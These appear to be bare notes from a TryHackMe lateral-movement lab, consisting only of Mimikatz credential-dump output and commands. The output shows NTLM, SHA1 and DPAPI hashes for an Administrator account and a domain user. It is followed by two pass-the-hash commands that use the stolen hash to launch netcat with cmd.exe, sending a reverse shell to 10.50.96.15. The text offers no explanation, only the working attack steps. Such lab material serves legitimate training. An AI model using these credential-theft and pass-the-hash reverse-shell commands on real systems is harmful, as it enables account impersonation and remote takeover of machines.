
```
RID  : 000001f4 (500)                                                      
User : Administrator                                                       
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7 
```

```
Authentication Id : 0 ; 587480 (00000000:0008f6d8)                              
Session           : RemoteInteractive from 3                                    
User Name         : t1_toby.beck                                                
Domain            : ZA                                                          
Logon Server      : THMDC                                                       
Logon Time        : 1/30/2024 1:51:02 PM                                        
SID               : S-1-5-21-3330634377-1326264276-632209373-4607               
        msv :                                                                   
         [00000003] Primary                                                     
         * Username : t1_toby.beck                                              
         * Domain   : ZA                                                        
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                          
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                  
         * DPAPI    : d9cd92937c7401805389fbb51260c45f 
```

```shell-session
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe  /run:"c:\tools\nc64.exe -e cmd.exe 10.50.96.15 5555"
```

```shell-session
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.96.15 5556"
```